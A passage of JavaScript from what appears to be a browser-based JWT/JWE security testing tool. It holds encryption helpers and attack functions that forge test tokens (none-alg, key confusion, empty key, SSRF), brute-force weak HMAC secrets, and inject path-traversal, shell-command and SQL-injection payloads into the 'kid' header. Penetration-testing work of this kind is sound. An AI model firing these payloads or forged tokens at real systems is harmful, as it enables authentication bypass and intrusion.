        const kek_input_b64 = is_kek_base_64 ? document.getElementById("keyJWE").value : URL_to_base64(b64URLencode(document.getElementById("keyJWE").value))
        // Check if key is set and has the right length
        if (_jwe_algorithm_to_key_length[alg] !== base64ToUint8Array(kek_input_b64).length && !(alg.startsWith("PBES2"))) {
            jwe_error_message(`Expected Key Length: ${_jwe_algorithm_to_key_length[alg]} bytes, got: ${base64ToUint8Array(kek_input_b64).length} bytes`);
            return false;
        }
        if (alg === "A128KW" || alg === "A192KW" || alg === "A256KW") {
            // Symmetric Key Encryption (AES-KW)
            var encrypted_cek = await encryptAESKW(cek, encryption_algorithm, kek_input_b64);
        }
        else if (alg === "A128GCMKW" || alg === "A192GCMKW" || alg === "A256GCMKW") {
            // Symmetric Key Encryption (AES-GCM)
            const key_Wrapping_Object = await encryptAES_GCM_KW(cek, encryption_algorithm, kek_input_b64);
            var encrypted_cek = key_Wrapping_Object.encrypted_cek;
            //let tmp_header = b64URLdecode(header);
            //header = b64URLencode(tmp_header.replace(/^(.)/,`$1"iv":"${tmp.iv}","tag":"${tmp.authentication_tag}",`))
            header = JSON.parse(b64URLdecode(header));
            header.iv = key_Wrapping_Object.iv
            header.tag = key_Wrapping_Object.authentication_tag;
            document.getElementById("decodedHeaderJWE").value = JSON.stringify(header, undefined, 4);
            header = b64URLencode(JSON.stringify(header));
        }
        else if (alg === "PBES2-HS256+A128KW" || alg === "PBES2-HS384+A192KW" || alg === "PBES2-HS512+A256KW") {
            // PBES2 Key Encryption
            const salt = document.getElementById("saltJWE").value;
            console.debug("salt:", salt);
            if (!salt) {
                jwe_error_message("Salt is required for PBES2 Key Encryption");
                return false;
            }
            const iterations = document.getElementById("pbkdf2IterationsJWE").value;
            if (!iterations) {
                jwe_error_message("PBKDF2 Iterations are required for PBES2 Key Encryption");
                return false;
            }
            var encrypted_cek = await encryptPBES2(cek, alg, encryption_algorithm, kek_input_b64, salt, iterations);
            header = JSON.parse(b64URLdecode(header));
            header.p2s = base64_to_URL(salt);
            header.p2c = iterations;
            document.getElementById("decodedHeaderJWE").value = JSON.stringify(header, undefined, 4);
            header = b64URLencode(JSON.stringify(header));

        }
    }

    console.debug("enc_cek:", encrypted_cek);

    // generate IV
    let ivLength = 12; //  AES-GCM
    if (encryption_algorithm.includes("CBC-HS")) {
        ivLength = 16; //  AES-CBC-HMAC

    }
    const iv = crypto.getRandomValues(new Uint8Array(ivLength));
    //const iv = base64urlToUint8Array('AxY8DCtDaGlsbGljb3RoZQ')

    // encrypt the plaintext
    const encrypted_data = await encryptPlaintextJWE(body, encryption_algorithm, cek, header, iv);

    // Create the JWE token and set it in the input field
    document.getElementById("tokenJWE").value = header + "." + encrypted_cek + '.' + Uint8ArrayTobase64Url(iv) + '.' + encrypted_data["ciphertext"] + '.' + encrypted_data["authentication_tag"];
    console.debug("body b64Url", body);
    console.debug("body array", base64urlToUint8Array(body));
    console.debug("iv (b64):", URL_to_base64(Uint8ArrayTobase64Url(iv)));
    console.debug("aad (b64):", URL_to_base64(header));
    console.debug("auth_tag (b64):", URL_to_base64(encrypted_data["authentication_tag"]));
    console.debug("ct (b64):", URL_to_base64(encrypted_data["ciphertext"]));
    console.debug("cek (hex):", cek);
}

/**
 *
 * Encrypts the CEK (Content Encryption Key) using AES Key Wrap (AES-GCM-KW).
 * This function is used to wrap the CEK with a Key Encryption Key (KEK).
 * It takes the CEK, algorithm, and KEK as inputs and returns the encrypted CEK.
 *
 *
 * @param {string} cek - Base64: The Content Encryption Key (CEK) to be encrypted.
 * @param {string} alg - The algorithm used for Content Encryption (e.g A128GCM, A256CBC-HS512).
 * @param {string} kek - Base64: The Key Encryption Key (KEK) used for wrapping the CEK.
 * @return {Promise<{encrypted_cek:string, iv: string, authentication_tag: string}>} - Base64URL: The encrypted CEK wrapped with the KEK, along with the IV and authentication tag.
 * @throws {Error} - Throws an error if the encryption fails.
 */
async function encryptAES_GCM_KW(cek, alg, kek) {
    const importedKek = await crypto.subtle.importKey(
        "raw",
        base64urlToUint8Array(base64_to_URL(kek)),
        { name: "AES-GCM" },
        true,
        ["wrapKey"]
    );
    const iv = crypto.getRandomValues(new Uint8Array(12)); // AES-GCM uses a 12 byte IV
    if (alg === "A128CBC-HS256" || alg === "A192CBC-HS384" || alg === "A256CBC-HS512") {
        const rawCekBuffer = base64urlToUint8Array(base64_to_URL(cek));
        assert((((alg.slice(1, 4) / 4) === rawCekBuffer.length)), `${alg}: bad full_keylength. Got: ${rawCekBuffer.length}`);
        const importedCek = await crypto.subtle.importKey(
            "raw",
            rawCekBuffer,
            {
                name: "HMAC",
                hash: { name: _alg_converter[alg.split('-')[1]] } // A128CBC-HS256 -> SHA-256
            },
            true,
            ["sign"]
        );
        const encrypted_buffer = new Uint8Array(await crypto.subtle.wrapKey(
            "raw",
            importedCek,
            importedKek,
            {
                name: "AES-GCM",
                iv: iv, // AES-GCM uses a 12 byte IV
                tagLength: 128 // AES-GCM uses a 128-bit tag
            }
        ));
        const encrypted_cek = new Uint8Array(encrypted_buffer.slice(0, encrypted_buffer.length - 16)); // Remove the last 16 bytes (authentication tag)
        const authentication_tag = new Uint8Array(encrypted_buffer.slice(encrypted_buffer.length - 16)); // Last 16 bytes are the authentication tag
        return {
            encrypted_cek: Uint8ArrayTobase64Url(encrypted_cek),
            iv: Uint8ArrayTobase64Url(iv),
            authentication_tag: Uint8ArrayTobase64Url(authentication_tag)
        }
    }
    else { // GCM 128, 192, 256
        const importedCek = await crypto.subtle.importKey(
            "raw",
            base64urlToUint8Array(base64_to_URL(cek)),
            {
                name: _alg_converter[alg], // A128GCM -> AES-GCM, A256CBC-HS512 -> AES-CBC
                length: parseInt(alg.slice(1, 4)) // A128GCM -> 128
            },
            true,
            ["encrypt"]
        );
        const encrypted_buffer = new Uint8Array(await crypto.subtle.wrapKey(
            "raw",
            importedCek,
            importedKek,
            {
                name: "AES-GCM",
                iv: iv, // AES-GCM uses a 12 byte IV
                tagLength: 128 // AES-GCM uses a 128-bit tag
            }
        ));
        const encrypted_cek = new Uint8Array(encrypted_buffer.slice(0, encrypted_buffer.length - 16)); // Remove the last 16 bytes (authentication tag)
        const authentication_tag = new Uint8Array(encrypted_buffer.slice(encrypted_buffer.length - 16)); // Last 16 bytes are the authentication tag
        return {
            encrypted_cek: Uint8ArrayTobase64Url(encrypted_cek),
            iv: Uint8ArrayTobase64Url(iv),
            authentication_tag: Uint8ArrayTobase64Url(authentication_tag)
        }
    }

}

/**
 * Encrypts the CEK (Content Encryption Key) using PBES2 (Password-Based Encryption Scheme 2).
 * This function is used to derive a key from a password and then encrypt the CEK with that derived key.
 * It takes the CEK, algorithm, KEK (Key Encryption Key), salt, and iterations as inputs and returns the encrypted CEK.
 *
 * @param {string} cek - Base64: The Content Encryption Key (CEK) to be encrypted.
 * @param {string} alg - The PBES2 algorithm used for key derivation (e.g., PBES2-HS256+A128KW).
 * @param {string} encryption_alg - The encryption algorithm used for the CEK (e.g., A128GCM, A256CBC-HS512).
 * @param {string} password - Base64: The Password used which will be derived to Key Encryption Key.
 * @param {string} salt - Base64: The salt used for key derivation.
 * @param {Number} iterations - The number of iterations for the key derivation function (PBKDF2).
 * @return {Promise<string>} - Base64URL: The encrypted CEK wrapped with the KEK.
 */
async function encryptPBES2(cek, alg, encryption_alg, password, salt, iterations) {
    const passwordBuffer = await crypto.subtle.importKey(
        "raw",
        base64ToUint8Array(password),
        { name: "PBKDF2" },
        false,
        ["deriveKey"]
    );

    const kek = await crypto.subtle.deriveKey(
        {
            name: "PBKDF2",
            salt: base64ToUint8Array(salt),
            iterations: parseInt(iterations),
            hash: { name: _alg_converter[alg] } // PBES2-HS256+A128KW -> SHA-256
        },
        passwordBuffer,
        {
            name: "AES-KW",
            length: parseInt(alg.split("+")[1].slice(1, 4)) // A128GCM -> 128
        },
        true,
        ["wrapKey"]
    )
    if (encryption_alg === "A128CBC-HS256" || encryption_alg === "A192CBC-HS384" || encryption_alg === "A256CBC-HS512") {
        // Since CBC CEK is double length (HMAC + AES-CBC), we need to import it as HMAC key
        const rawCekBuffer = base64ToUint8Array(cek);
        assert(((encryption_alg.slice(1, 4) / 4 === rawCekBuffer.length)), `${alg}: bad full_keylength. Got: ${rawCekBuffer.length}\n Expected: ${encryption_alg.slice(1, 4) / 4} bytes`);
        const importedCek = await crypto.subtle.importKey(
            "raw",
            rawCekBuffer,
            {
                name: "HMAC",
                hash: { name: _alg_converter[encryption_alg.split('-')[1]] } // A128CBC-HS256 -> SHA-256
            },
            true,
            ["sign"]
        );
        const encrypted_cek = await crypto.subtle.wrapKey(
            "raw",
            importedCek,
            kek,
            { name: "AES-KW" }
        );
        return Uint8ArrayTobase64Url(encrypted_cek);
    }
    else { // GCM 128, 192, 256
        const rawCekBuffer = base64ToUint8Array(cek);
        const importedCek = await crypto.subtle.importKey(
            "raw",
            rawCekBuffer,
            {
                name: _alg_converter[encryption_alg], // A128GCM -> AES-GCM, A256CBC-HS512 -> AES-CBC
                length: parseInt(encryption_alg.slice(1, 4)) // A128GCM -> 128
            },
            true,
            ["encrypt"]
        );
        const encrypted_cek = await crypto.subtle.wrapKey(
            "raw",
            importedCek,
            kek,
            { name: "AES-KW" }
        );
        return Uint8ArrayTobase64Url(encrypted_cek);
    }
}

/**
 *
 * Encrypts the CEK (Content Encryption Key) using AES Key Wrap (AES-KW).
 * This function is used to wrap the CEK with a Key Encryption Key (KEK).
 * It takes the CEK, algorithm, and KEK as inputs and returns the encrypted CEK.
 *
 *
 * @param {string} cek - Base64: The Content Encryption Key (CEK) to be encrypted.
 * @param {string} alg - The algorithm used for Content Encryption (e.g A128GCM, A256CBC-HS512).
 * @param {string} kek - Base64: The Key Encryption Key (KEK) used for wrapping the CEK.
 * @return {Promise<string>} - Base64URL: The encrypted CEK wrapped with the KEK.
 * @throws {Error} - Throws an error if the encryption fails.
 */
async function encryptAESKW(cek, alg, kek) {
    console.debug("encryptAESKW: alg ", alg, _alg_converter[alg]);
    const importedKek = await crypto.subtle.importKey(
        "raw",
        base64ToUint8Array(kek),
        {
            name: "AES-KW"
        },
        true,
        ["wrapKey"]
    );
    if (alg === "A128CBC-HS256" || alg === "A192CBC-HS384" || alg === "A256CBC-HS512") {
        // Since CBC CEK is double length (HMAC + AES-CBC), we need to import it as HMAC key
        const rawCekBuffer = base64urlToUint8Array(base64_to_URL(cek))
        assert((((alg.slice(1, 4) / 4) === rawCekBuffer.length)), `${alg}: bad full_keylength. Got: ${rawCekBuffer.length}`)
        const importedCek = await crypto.subtle.importKey(
            "raw",
            rawCekBuffer,
            {
                name: "HMAC",
                hash: { name: _alg_converter[alg.split('-')[1]] } // A128CBC-HS256 -> SHA-256
            },
            true,
            ["sign"]
        );
        const encrypted_cek = await crypto.subtle.wrapKey(
            "raw",
            importedCek,
            importedKek,
            {
                name: "AES-KW"
            }
        );
        return Uint8ArrayTobase64Url(encrypted_cek);
    }
    else { // GCM 128, 192, 256
        const importedCek = await crypto.subtle.importKey(
            "raw",
            base64urlToUint8Array(base64_to_URL(cek)),
            {
                name: _alg_converter[alg], // A128GCM -> AES-GCM, A256CBC-HS512 -> AES-CBC
                length: parseInt(alg.slice(1, 4)) // A128GCM -> 128
            },
            true,
            ["encrypt"]
        );
        const encrypted_cek = await crypto.subtle.wrapKey(
            "raw",
            importedCek,
            importedKek,
            {
                name: "AES-KW"
            }
        );
        return Uint8ArrayTobase64Url(encrypted_cek);
    }
}

/**
 * Encrypts the plaintext for JWE (JSON Web Encryption) using the specified algorithm and CEK (Content Encryption Key).
 * This function handles the encryption of the plaintext using AES-GCM or AES-CBC-HMAC based on the provided algorithm.
 *
 * @param {string} plaintext - Base64Url: The plaintext to be encrypted.
 * @param {string} encryption_alg: The encryption algorithm to use (e.g., A128GCM, A256CBC-HS512).
 * @param {string} raw_cek - Base64: The raw Content Encryption Key (CEK) used for encryption.
 * @param {string} aad - Base64Url: The Additional Authenticated Data (AAD) used for encryption, typically the protected header.
 * @param {Uint8Array} iv -  The initialization vector (IV) used for encryption.
 * @return {Promise<{ciphertext: string, authentication_tag: string}>} - Returns an object containing the ciphertext and authentication tag, both in Base64Url format.
 */
async function encryptPlaintextJWE(plaintext, encryption_alg, raw_cek, aad, iv) {
    console.log(_alg_converter[encryption_alg], encryption_alg);
    const enc = new TextEncoder();

    console.debug("aad:", aad);
    console.debug("iv:", iv);
    // Encrypt AES128GCM
    if (["A128GCM", "A192GCM", "A256GCM"].includes(encryption_alg)) {
        if (iv.length !== 12) {
            throw new Error("AES-GCM requires a 12 byte IV, got: " + iv.length);
        }
        const cek = await crypto.subtle.importKey(
            "raw",
            base64ToUint8Array(raw_cek),
            {
                name: "AES-GCM",
                length: parseInt(encryption_alg.slice(1, 4)) // A128GCM -> 128
            },
            true,
            ["encrypt", "decrypt"]
        );
        var encryptedData = new Uint8Array(await crypto.subtle.encrypt(
            {
                name: "AES-GCM",
                iv: iv,
                additionalData: enc.encode(aad),
                tagLength: 128 // AES-GCM uses a 128-bit tag
            },
            cek,
            base64urlToUint8Array(plaintext)
        ));
        console.log(encryptedData);
        return {
            ciphertext: Uint8ArrayTobase64Url(encryptedData.slice(0, encryptedData.length - 16)),
            authentication_tag: Uint8ArrayTobase64Url(encryptedData.slice(encryptedData.length - 16))
        };

    }
    // Encrypt AES128CBC-HS256, AES192CBC-HS384, AES256CBC-HS512
    else if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)) {
        assert(iv.length === 16, `AES-CBC requires a 16 byte IV, got: ${iv.length}`);

        // For AES-CBC-HMAC, split the key - first half is for HMAC, second half for AES-CBC
        const full_key_buffer = base64ToUint8Array(raw_cek);
        const hmac_key_buffer = full_key_buffer.slice(0, full_key_buffer.length / 2);
        const enc_key_buffer = full_key_buffer.slice(full_key_buffer.length / 2);
        assert(full_key_buffer.length === encryption_alg.slice(1, 4) / 4,
            `AES-CBC requires a ${encryption_alg.slice(1, 4) / 4} byte CEK, got: ${full_key_buffer.length}`);

        console.debug("hmac_key_buffer", hmac_key_buffer);
        console.debug("enc_key_buffer", enc_key_buffer);
        console.debug("plaintext (buffer):", base64urlToUint8Array(plaintext));

        // AES-CBC-HMAC: Import the encryption key
        const cek = await crypto.subtle.importKey(
            "raw",
            enc_key_buffer,
            {
                name: "AES-CBC"
            },
            true,
            ["encrypt", "decrypt"]
        );

        // AES-CBC-HMAC: Encrypt the plaintext
        var ciphertext = await crypto.subtle.encrypt(
            {
                name: "AES-CBC",
                iv: iv
            },
            cek,
            base64urlToUint8Array(plaintext)
        );

        // AES-CBC-HMAC: Import the HMAC key
        const hmacKey = await crypto.subtle.importKey(
            "raw",
            hmac_key_buffer,
            {
                name: "HMAC",
                hash: _alg_converter[encryption_alg.split('-')[1]] // A128CBC-HS256 -> SHA-256
            },
            true,
            ["sign"]
        );

        // HMAC = HMAC(AAD || IV || Ciphertext || AL)
        const aadBuffer = enc.encode(aad);
        const al = getAL(aadBuffer);
        const ciphertextBuffer = new Uint8Array(ciphertext);
        const toBeSigned = new Uint8Array([...aadBuffer, ...iv, ...ciphertextBuffer, ...al])
        console.debug("toBeSigned (Buffer):", toBeSigned);
        console.debug("toBeSigned b64Url:", Uint8ArrayTobase64Url(toBeSigned));

        // AES-CBC-HMAC: Sign the data to create the authentication tag
        const signature = new Uint8Array(await crypto.subtle.sign(
            'HMAC',
            hmacKey,
            toBeSigned
        ));
        return {
            ciphertext: Uint8ArrayTobase64Url(ciphertextBuffer),
            authentication_tag: Uint8ArrayTobase64Url(signature.slice(0, encryption_alg.split("CBC-HS")[1] / 16)) // HMAC tag is 16 bytes
        };
    }
}

/**
 * Encrypts the Content Encryption Key (CEK) using RSA-OAEP(-256).
 * This function is used to encrypt the CEK with a public key in publicKeyJWE.
 * It checks if the public key is provided, generates a new RSA key pair if not, and then encrypts the CEK using the RSA-OAEP algorithm.
 *
 *
 * @param {string} cek - Base64: The Content Encryption Key (CEK) to be encrypted.
 * @param {string} alg - The algorithm used for encryption (RSA-OAEP, RSA-OAEP-256).
 * @return {Promise<string>} - Base64URL: The encrypted CEK.
 */
async function encryptRSA_OAEP(cek, alg) {
    console.debug("encryptRSA_OAEP: alg ", alg, _alg_converter[alg]);
    if (!(document.getElementById("privateKeyJWE").value)) {
        const keypair = await generateRSA_OAEP(alg);
        document.getElementById('privateKeyJWE').value = keypair[0];
        document.getElementById('publicKeyJWE').value = keypair[1];
    }
    try {
        const publicKey = await crypto.subtle.importKey(
            document.getElementById('publicKeyJWE').value.match(/^-----BEGIN [A-Z ]+-----/) ? "spki" : "jwk",
            decodeKey(document.getElementById('publicKeyJWE').value, isPublicKey = true),
            {
                name: "RSA-OAEP",
                hash: _alg_converter[alg] // RSA-OAEP or RSA-OAEP-256 -> SHA-1 or SHA-256
            },
            true,
            ['encrypt']
        );
        console.log("hier");
        const enc = new TextEncoder();
        var encrypted = await crypto.subtle.encrypt(
            {
                name: "RSA-OAEP"
            },
            publicKey,
            base64ToUint8Array(cek)
        );
        return Uint8ArrayTobase64Url(encrypted);

    }
    catch (e) {
        document.getElementById("errorMessagePublicKeyJWE").innerText = "Public Key: " + e;
    }
    return "";
}

// #endregion ====================== End of JWE Functions

// #region ====================== Attack Functions

/**
 * Generates vulnerable tokens based on the selected vulnerabilities from the checkboxes.
 * It creates a textfile with the generated tokens and triggers a download.
 * This function is called when the user clicks the "Generate Vulnerable Tokens" button.
 * It retrieves the JWT token from the input field (jwt-attacks-input), validates it, and then iterates through the selected vulnerabilities to generate tokens.
 * It uses the attack functions to generate the tokens and collects them in an array.
 * @return {Promise<array.TestCase|[]>} array of the generated test cases or an empty array if no tokens were generated or an error occurred
 *
 */
async function generateVulnerableTokens() {
    const jwt = document.getElementById("jwt-attacks-input").value;
    document.getElementById("jwt-attacks-error-message").innerText = ""; // reset the error message
    const spans = document.querySelectorAll('span.vulnerability-with-error-message');
    spans.forEach(span => {
        span.classList.remove('vulnerability-with-error-message');
    });
    if (!isValidJWT(jwt)) {
        jwt_attacks_error_message("Invalid JWT token");
        return [];
    }
    document.getElementById("weakHMAC-result").innerText = ""; // reset the result message
    let results = [];
    const selectedVulnerabilities = []
    // get all selected vulnerabilities from the checkboxes
    document.querySelectorAll('#vulnerabilities-list input.vulnerability-checkbox:checked').forEach(checkbox => {
        selectedVulnerabilities.push(checkbox.getAttribute('data-vuln'));
    });
    if (selectedVulnerabilities.length === 0) {
        jwt_attacks_error_message('No vulnerabilities selected.');
        return [];
    }
    console.debug("Selected vulnerabilities:", selectedVulnerabilities);
    // make input fields mandatory - SSRF, KeyConfusion
    // Check if required input fields are filled for specific vulnerabilities
    for (const vulnKey of selectedVulnerabilities) {
        switch (vulnKey) {
            case 'SSRF':
                if (!document.getElementById("SSRFURL").value) {
                    jwt_attacks_error_message("Please enter a URL for SSRF attack");
                    document.querySelector('#vuln-SSRF ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
                    return [];
                }
                break;
            case 'KeyConfusion':
                if (!document.getElementById("KeyConfusionKey").value) {
                    jwt_attacks_error_message("Please enter a Key (JWK or PEM) for Key Confusion attack");
                    document.querySelector('#vuln-KeyConfusion ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
                    return [];
                }
                break;
            case 'CustomKey':
                if (document.getElementById("testCustomKeyViaURL").checked) {
                    if (!document.getElementById("CustomKeyURL").value) {
                        jwt_attacks_error_message("Please enter a URL for Custom Key attack");
                        document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
                        return [];
                    }
                    else if (!document.getElementById("CustomKey").value) {
                        jwt_attacks_error_message("Please enter a Key (JWK) for Custom Key attack");
                        document.querySelector('#vuln-CustomKey ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
                        return [];
                    }
                }
                break;
            case 'Kid':
                if (document.getElementById("useKidCustomPayloadList").checked && !document.getElementById("kidCustomPayloadList").value) {
                    document.querySelector('#vuln-Kid ~ div span.vulnerability-name').classList.add('vulnerability-with-error-message');
                    jwt_attacks_error_message("Please enter a custom payload list for Kid attack");
                    return [];
                }
        }
    }

    TestCase.resetCounter(); // since I used an static counter in TestCase, I need to reset it here
    // generate Tokens for each selected vulnerability
    for (const vulnKey of selectedVulnerabilities) {
        console.debug("Running attack:", vulnKey);
        switch (vulnKey) {
            case 'SignatureExclusion':
                results.push(attack_signature_exclusion(jwt));
                break
            case 'SSRF':
                results.push(...attack_SSRF(jwt, document.getElementById("SSRFURL").value));
                break
            case 'NoneAlg':
                results.push(...attack_none_alg(jwt));
                break
            case 'PsychicSignature':
                results.push(attackPsychicSignature(jwt))
                break
            case 'CustomKey':
                let algsToBeTested = [document.getElementById("customKeyAlg").value];
                if (document.getElementById("testAllCustomKeyAlgs").checked) {
                    // If the user wants to test all algorithms with the custom key
                    // algsToBeTested = ['HS256', 'HS384', 'HS512', 'RS256', 'RS384', 'RS512', 'ES256', 'ES384', 'ES512', 'PS256', 'PS384', 'PS512'];
                    algsToBeTested = ['HS256', 'RS256', 'ES256', 'PS256'] // this should be enough, right?
                }
                let testCustomKeyViaURL = document.getElementById("testCustomKeyViaURL").checked;
                for (const alg of algsToBeTested) {
                    results.push(...await attackCustomKey(jwt, alg, document.getElementById("CustomKey").value, testCustomKeyViaURL, document.getElementById("CustomKeyURL").value, true))
                    testCustomKeyViaURL = false;
                }
                break
            case 'KeyConfusion':
                // Not sure if there is a way that HS256 does not work but HS384/HS512 work
                // But since were are assuming that the server does something weird while validating
                // we can also assume that it may only work with on of the algorithms
                // And since they are automatically generated, we can just try our luck
                for (const alg of ["HS256", "HS384", "HS512"]) {
                    results.push(...await attackKeyConfusion(jwt, alg, document.getElementById("KeyConfusionKey").value, true))
                }
                break
            case 'WeakHMACKey':
                // This token will be added to result list, but will also message the user in the UI
                results.push(await attackWeakHMACKey(jwt))
                break
            case 'EmptyKey':
                results.push(...await attackEmptyKey(jwt))
                break
            case 'Kid':
                const useCustomKidPayloads = document.getElementById("useKidCustomPayloadList").checked;
                if (useCustomKidPayloads) {
                    const customKidPayloadList = parsePayloadContentForKid(document.getElementById("kidCustomPayloadList").value);
                    if (customKidPayloadList.length === 0) {
                        jwt_attacks_error_message("Custom Kid Payload List is empty or invalid");
                        break;
                    }
                    results.push(...await attackKid(jwt, useCustomKidPayloads, true, customKidPayloadList));
                }
                else {
                    results.push(...await attackKid(jwt, useCustomKidPayloads));
                }

                break
        }

    }

    let only_token_results = []
    // filter empty results coming from the attack functions error handling
    results = results.filter(item => !Array.isArray(item) || item.length > 0);

    // filter out the testToken from the results
    for (const result of results) {
        if (result) only_token_results.push(result.testToken)
    }
    if (only_token_results.length === 0) {
        return [];
    }

    // create a text file with the generated tokens and trigger a download
    const blob = new Blob([only_token_results.join('\n')], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'vulnerable_tokens.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);

    return results;
}

async function attackKid(token, useDefaultPayloadList = true, useCustomPayloadlist = false, customPayloadList = []) {
    // Sanity checks
    if (!(isValidJWT(token))) {
        jwt_attacks_error_message("attackKid: invalid token")
        return [];
    }
    if (useCustomPayloadlist) {
        if (customPayloadList.length === 0) {
            jwt_attacks_error_message("attackKid: custom payload list is empty")
            return [];
        }
    }

    const [header, body, valid_signature] = token.split(".");
    const alg = JSON.parse(b64URLdecode(header)).alg;

    //* payloads        |               kidPayloads                 | key
    // 1. ../../../../../../../../../../../../etc/passwd    | undefined -> use default signature/key
    // 2. ../../../../../../../../../../../../dev/null      | empty key -> use attackEmptyKey
    // 3. ;id;                                              | undefined -> use default signature/key
    // 4. &id&                                              | undefined -> use default signature/key
    // 5. || id ||                                          | undefined -> use default signature/key
    // 6. ;ping -c 10 127.0.0.1;                            | undefined -> use default signature/key
    // 7. &ping -c 10 127.0.0.1&                            | undefined -> use default signature/key
    // 8. || ping -c 10 127.0.0.1||                         | undefined -> use default signature/key
    // 9. 1234' UNION SELECT 'aaaa                          | "aaaa"

    const payloadListWithKeys = [
        { payload: "../../../../../../../../../../../../etc/passwd", key: undefined }, // 1
        { payload: "../../../../../../../../../../../../dev/null", key: "\0" }, // 2
        { payload: ";id;", key: undefined }, // 3
        { payload: "&id&", key: undefined }, // 4
        { payload: "|| id ||", key: undefined }, // 5
        { payload: ";ping -c 10 127.0.0.1;", key: undefined }, // 6
        { payload: "&ping -c 10 127.0.0.1&", key: undefined }, // 7
        { payload: "||ping -c 10 127.0.0.1||", key: undefined }, // 8
        { payload: "1234' UNION SELECT 'aaaa", key: btoa("aaaa") } // 9

    ]
    if (useCustomPayloadlist) {
        payloadListWithKeys.push(...customPayloadList)
    }
    let testCases = [];
    for (const { payload, key } of payloadListWithKeys) {
        let parsedHeader = JSON.parse(b64URLdecode(header));
        parsedHeader.kid = payload; // set the kid to the payload

        if (key === undefined) {
            // use the default signature/key
            const header_with_kid = unescapeCustomJsonKeys(JSON.stringify(parsedHeader));
            const testToken = `${b64URLencode(header_with_kid)}.${body}.${valid_signature}`;
            console.debug("Test Token:", testToken);
            testCases.push(new TestCase({
                description: "Kid Attack - no Key",
                variantName: `Kid: ${payload}`,
                originalToken: token,
                testToken: testToken,
                originalReadable: JSON.parse(b64URLdecode(header)),
                testReadable: header_with_kid,
                vulnerability: vulnerabilities.Kid
            }))
        }
        else if (key === "\0" || key === "AA==") { // use the empty key
            parsedHeader.alg = "HS256"
            const header_with_kid = unescapeCustomJsonKeys(JSON.stringify(parsedHeader));

            const signature = await signHS(b64URLencode(header_with_kid), body, "HS256", "\0"); // empty key
            const testToken = `${b64URLencode(header_with_kid)}.${body}.${signature}`;
            console.debug("Test Token:", testToken);
            testCases.push(new TestCase({
                description: "Kid Attack with Empty Key",
                variantName: `Kid: ${payload}`,
                originalToken: token,
                testToken: testToken,
                originalReadable: JSON.parse(b64URLdecode(header)),
                testReadable: header_with_kid,
                vulnerability: vulnerabilities.Kid
            }))
        }
        else { // use the key to sign the token
            parsedHeader.alg = "HS256"
            const header_with_kid = unescapeCustomJsonKeys(JSON.stringify(parsedHeader));
            const signature = await signHS(b64URLencode(header_with_kid), body, "HS256", key, keyIsBase64 = true); // custom key
            const testToken = `${b64URLencode(header_with_kid)}.${body}.${signature}`;
            console.debug("Test Token:", testToken);
            testCases.push(new TestCase({
                description: "Kid Attack with Custom Key",
                variantName: `Kid: ${payload} \n Key: ${key}`,
                originalToken: token,
                testToken: testToken,
                originalReadable: JSON.parse(b64URLdecode(header)),
                testReadable: header_with_kid,
                vulnerability: vulnerabilities.Kid
            }))
        }
    }
    return testCases;

}
/**
 * Bruteforces the HMAC key using a list of default secrets.
 * Returns the test case object if a weak key is found, but also displays a message in the UI.
 * The list of secrets is fetched from a local file (jwt.secrets.list). Original github link can be found in this function.
 * @param {string} token - JWT token (HSxxx algorithm)
 * @return {Promise<TestCase|[]>} test case object or an empty array if no key was found / error occurred
 */
async function attackWeakHMACKey(token) {
    // Bruteforcing the HMAC key with a list of default secrets https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
    // On my Laptop it took around 5 seconds to bruteforce the whole list (100000 keys)
    // Todo: add a hashcat/john command so that the user can bruteforce faster

    // sanity checks
    if (!(isValidJWT(token))) {
        jwt_attacks_error_message("attackWeakHMACKey: invalid token")
        return [];
    }
    const [header, body, valid_signature] = token.split(".");
    const alg = JSON.parse(b64URLdecode(header)).alg;
    if (!valid_signature) {
        jwt_attacks_error_message("attackWeakHMACKey: invalid token, no signature")
        return [];
    }
    if (!alg.startsWith("HS")) {
        jwt_attacks_error_message("attackWeakHMACKey: invalid alg, only HSxxx supported")
        return [];
    }

    // fetch list of secrets and split it into an array
    const secrets = await fetch('jwt.secrets.list')
        .then(response => response.text())
        .then(data => data.split('\n').map(secret => secret.replace(/\r$/, '')).filter(secret => secret.trim() !== ''));

    // try to verify the token with each secret
    for (let key of secrets) {
        if (await crypto.subtle.verify('HMAC', await crypto.subtle.importKey('raw', new TextEncoder().encode(String(key)), { name: "HMAC", hash: _alg_converter[alg] }, false, ["verify"]), base64urlToUint8Array(valid_signature), new TextEncoder().encode(header + "." + body))) {
            // ^ Unnecessary complicated but a working verify oneliner

            // Verification succeeded, we found a weak key
            console.info("Weak HMAC Key found", key);
            document.getElementById("weakHMAC-result").innerText = "Weak HMAC Key found: " + key;
            return new TestCase({
                description: "Weak HMAC Key Attack",
                variantName: `${alg}: Key:  ${key}`,
                originalToken: token,
                testToken: token,
                originalReadable: JSON.parse(b64URLdecode(header)),
                testReadable: JSON.parse(b64URLdecode(header)),
                vulnerability: vulnerabilities.WeakHMACKey
            })
        }
    }
}

/**
 * Attacks the JWT token with an empty key (\\x00 / AA==) using HSxxx algorithms.
 *
 * @param {string} token JWT token
 * @return {Promise<TestCase[]>} array of test cases with the generated tokens
 */
async function attackEmptyKey(token) {
    // Signing the token via HSxxx with a empty key \x00 / AA==
    // https://redfoxsec.com/blog/jwt-deep-dive-into-algorithm-confusion/

    if (!(isValidJWT(token))) {
        jwt_attacks_error_message("attackEmptyKey: invalid token")
        return [];
    }
    const [header, body, _] = token.split(".")
    const header_parsed = JSON.parse(b64URLdecode(header));
    const algs = ["HS256", "HS384", "HS512"];
    const test_cases = [];
    // pretty straight forward, just sign the token with an empty key and the algs
    // add a Test Case for each alg
    for (let alg of algs) {
        var header_with_custom_key = JSON.parse(b64URLdecode(header));
        header_with_custom_key.alg = alg;
        // header_with_custom_key.typ = "JWT"; // set it again just to be double safe.
        // remove ESCAPE_SEQUENCE from the header
        const header_with_duplicates = unescapeCustomJsonKeys(JSON.stringify(header_with_custom_key))
